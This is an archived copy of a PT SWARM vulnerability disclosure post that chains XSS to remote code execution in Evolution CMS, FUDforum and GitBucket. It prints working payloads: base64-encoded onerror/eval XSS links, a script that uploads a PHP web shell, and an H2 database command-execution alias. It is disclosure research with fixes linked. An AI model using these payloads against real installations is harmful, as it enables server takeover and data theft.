---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-28_researching-open-source-apps-for-xss-to-rce-flaws.md
original_filename: 2022-07-28_researching-open-source-apps-for-xss-to-rce-flaws.md
title: Researching Open Source apps for XSS to RCE flaws
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- cloud-security
language: en
raw_sha256: 3f55c54cd51c45e96d1470a8086441d1451bc42759f80786366637e61e322ccc
text_sha256: 7bcba340549020bbd008a0d5f844089718f30d13e56f8588876d527168498003
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Researching Open Source apps for XSS to RCE flaws

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-28_researching-open-source-apps-for-xss-to-rce-flaws.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, cloud-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `3f55c54cd51c45e96d1470a8086441d1451bc42759f80786366637e61e322ccc`
- Text SHA256: `7bcba340549020bbd008a0d5f844089718f30d13e56f8588876d527168498003`


## Content

---
title: "Researching Open Source apps for XSS to RCE flaws"
page_title: "Researching Open Source apps for XSS to RCE flaws – PT SWARM"
url: "https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/"
final_url: "https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/"
authors: ["Aleksey Solovev"]
bugs: ["XSS", "RCE"]
publication_date: "2022-07-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2386
---

# Researching Open Source apps for XSS to RCE flaws

Written by [Aleksey Solovev](https://swarm.ptsecurity.com/author/aleksey-solovev/ "Posts by Aleksey Solovev") on July 28, 2022

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/preview-4.png)

## Author

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/c90212d7-123-150x150.png)

[Aleksey Solovev](https://swarm.ptsecurity.com/author/aleksey-solovev/ "Posts by Aleksey Solovev")

Web Application Security Expert 

**Cross-Site Scripting** (XSS) is one of the most commonly encountered attacks in web applications. If an attacker can inject a JavaScript code into the application output, this can lead not only to cookie theft, redirection or phishing, but also in some cases to a complete compromise of the system.

In this article I’ll show how to achieve a Remote Code Execution via XSS on the examples of Evolution CMS, FUDForum, and GitBucket.

## Evolution CMS v3.1.8

**Link:**<https://github.com/evolution-cms/evolution>  
**CVE:** Pending

Evolution CMS describes itself as the world’s fastest and the most customizable open source PHP CMS.

In Evolution CMS, I discovered an unescaped display of user-controlled data, which leads to the possibility of reflected XSS attacks:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/evo-1.png)manager/views/page/user_roles/permission.blade.php ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/evo-2.png)manager/views/page/user_roles/user_role.blade.php ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/evo-3.png)manager/views/page/user_roles/permissions_groups.blade.php

I will give an example of a link with a payload.
  
  
  https://192.168.1.76/manager/?a=35&id=1%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E

If an administrator authorized in the system follows the link or clicks on it, then the javascript code will be executed in the administrator’s browser:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/evo-4.png)Exploitation of reflected XSS attack in Evolution CMS

In the admin panel of Evolution CMS, in the file manager section, the administrator can upload files. The problem is that it cannot upload php files, however, it can edit existing ones.

We will give an example javascript code that will overwrite index.php file with `phpinfo()` function:
  
  
  $.get('/manager/?a=31',function(d) {
  let p = $(d).contents().find('input[name=\"path\"]').val();
  $.ajax({
  url:'/manager/index.php',
  type:'POST',
  contentType:'application/x-www-form-urlencoded',
  data:'a=31&mode=save&path='+p+'/index.php&content=<?php phpinfo(); ?>'}
  );
  });

It’s time to combine the payload and the javascript code described above, which, as an example, can be encoded in Base64:
  
  
  https://192.168.1.76/manager/?a=35&id=1%22%3E%3Cimg%20src=1%20onerror=eval(atob(%27JC5nZXQoJy9tYW5hZ2VyLz9hPTMxJyxmdW5jdGlvbihkKXtsZXQgcCA9ICQoZCkuY29udGVudHMoKS5maW5kKCdpbnB1dFtuYW1lPSJwYXRoIl0nKS52YWwoKTskLmFqYXgoe3VybDonL21hbmFnZXIvaW5kZXgucGhwJyx0eXBlOidQT1NUJyxjb250ZW50VHlwZTonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyxkYXRhOidhPTMxJm1vZGU9c2F2ZSZwYXRoPScrcCsnL2luZGV4LnBocCZjb250ZW50PTw/cGhwIHBocGluZm8oKTsgPz4nfSk7fSk7%27))%3E

In case of a successful attack on an administrator authorized in the system, the index.php file will be overwritten with the code that the attacker placed in the payload. In this case, this is a call of `phpinfo()` function:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/evo-5.png)Achieving Remote Code Execution via reflected XSS in Evolution CMS v3.1.8

## FUDforum v3.1.1

**Link:**<https://github.com/fudforum/FUDforum>  
**CVE:** Pending

FUDforum is a super fast and scalable discussion forum. It is highly customizable and supports unlimited members, forums, posts, topics, polls, and attachments.

In a FUDforum, I found unescaped display of user-controlled data in the name of an attachment in a private message or forum topic, which allows to perform a stored XSS attack. Attach and upload a file with the name: `<img src=1 onerror=alert()>.png` __. After downloading this file, the javascript code will be executed in the browser:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/fudforum-1.png)Exploitation of XSS vulnerability in FUDforum v3.1.1

The FUDforum admin panel has a file manager that allows you to upload files to the server, including files with the php extension.

An attacker can use stored XSS to upload a php file that can execute any command on the server.

There is already a [public exploit](https://packetstormsecurity.com/files/155261/FUDForum-3.0.9-Code-Execution-Cross-Site-Scripting.html) for the FUDforum, which, using a javascript code, uploads a php file on behalf of the administrator:
  
  
  const action = '/adm/admbrowse.php';
  
  function uploadShellWithCSRFToken(csrf) {
  let cur = '/var/www/html/fudforum.loc';
  let boundary = "-----------------------------347796892242263418523552968210";
  let contentType = "application/x-php";
  let fileName = 'shell.php';
  let fileData = "<?=`$_GET[cmd]`?>";
  let xhr = new XMLHttpRequest();
  xhr.open('POST', action, true);
  xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary=" + boundary);
  let body = "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="cur"\r\n\r\n';
  body += cur + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="SQ"\r\n\r\n';
  body += csrf + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="fname"; filename="' + fileName + '"\r\n';
  body += "Content-Type: " + contentType + "\r\n\r\n";
  body += fileData + "\r\n\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="tmp_f_val"\r\n\r\n';
  body += "1" + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="d_name"\r\n\r\n';
  body += fileName + "\r\n";
  body += "--" + boundary + "\r\n";
  body += 'Content-Disposition: form-data; name="file_upload"\r\n\r\n';
  body += "Upload File" + '\r\n';
  body += "--" + boundary + "--";
  xhr.send(body);
  }
  let req = new XMLHttpRequest();
  req.onreadystatechange = function() {
  if (req.readyState == 4 && req.status == 200) {
  let response = req.response;
  uploadShellWithCSRFToken(response.querySelector('input[name=SQ]').value);
  }
  }
  req.open("GET", action, true);
  req.responseType = "document";
  req.send();

Now an attacker can write a private message to himself and attach the mentioned exploit as a file. After the message has been sent to itself, needs to get the path to the hosted javascript exploit on the server:
  
  
  index.php?t=getfile&id=7&private=1

The next step is to prepare the javascript payload that will be executed via a stored XSS attack. The essence of the payload is to get an early placed exploit and run it:
  
  
  $.get('index.php?t=getfile&id=7&&private=1',function(d){eval(d)})

It remains to put everything together to form the full name of the attached file in private messages. We will encode the assembled javascript payload in Base64:
  
  
  <img src=1 onerror=eval(atob('JC5nZXQoJ2luZGV4LnBocD90PWdldGZpbGUmaWQ9NyYmcHJpdmF0ZT0xJyxmdW5jdGlvbihkKXtldmFsKGQpfSk='))>.png

After the administrator reads the private message sent by the attacker with the attached file, a file named shell.php will be created on the server on behalf of the administrator, which will allow the attacker to execute arbitrary commands on the server:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/fudforum-2.png)Achieving Remote Code Execution via stored XSS in FUDforum v3.1.1

## GitBucket v4.37.1

**Link:**<https://github.com/gitbucket/gitbucket>  
**CVE:** Pending

GitBucket is a Git platform powered by Scala with easy installation, high extensibility, and GitHub API compatibility.

In GitBucket, I found unescaped display of user-controlled issue name on the home page and attacker’s profile page (`/hacker?tab=activity`), which leads to a stored XSS:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/gitbucket-1.png)Exploitation of stored XSS in GitBucket v4.37.1

Having a stored XSS attack, can try to exploit it in order to execute code on the server. The admin panel has tools for performing SQL queries – Database viewer.

GitBucket use [H2 Database Engine](https://www.h2database.com/html/main.html) by default. For this database, there is [a publicly available exploit](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed) to achieve a Remote Code Execution.

So, all an attacker needs to do is create a PoC code based on this exploit, upload it to the repository and and use it during an attack:
  
  
  var url = "/admin/dbviewer/_query";
  $.post(url, {query: 'CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");return s.hasNext() ? s.next() : ""; }$$;'
  })
  .done(function(data) {$.post(url, {query: "CALL EXECVE('touch HACKED')"})})

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/gitbucket-2.png)Uploading the PoC code for exploiting H2 Database Engine via stored XSS to the repository

Now it remains to create a new issue or rename the old one and perform a stored XSS attack with an early exploit loaded:
  
  
  Issue 1"><script src="/hacker/Repo1/raw/f85ebe5d6b979ca69411fa84749edead3eec8de0/exploit.js"></script>

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/gitbucket-3.png)Creating a new issue with a payload

When the administrator visits the attacker’s profile page or the main page, an exploit will be executed on his behalf and a `HACKED` file will be created on the server:

![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/gitbucket-4.png)Using the administrator’s account to visit an attacker’s profile ![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/gitbucket-5.png)Checking whether Remote Code Execution was achieved

## Conclusions

We have demonstrated that a low-skilled attacker can easily achieve a remote code execution via any XSS attack in multiple open-source applications.

Information about all found vulnerabilities was reported to maintainers. Fixes are available in the official repositories:

  * [Evolution](https://github.com/evolution-cms/evolution/commit/4daa05017506bec322e2b482375b16e4456894c4)
  * [FUDforum](https://github.com/fudforum/FUDforum/releases/tag/v3.1.2)
  * [Gitbucket](https://github.com/gitbucket/gitbucket/releases/tag/4.37.2)

If you have something to add, please share your opinion on our Twitter.

[RCE](https://swarm.ptsecurity.com/tag/rce/), [Web Application Security](https://swarm.ptsecurity.com/tag/web-application-security/)
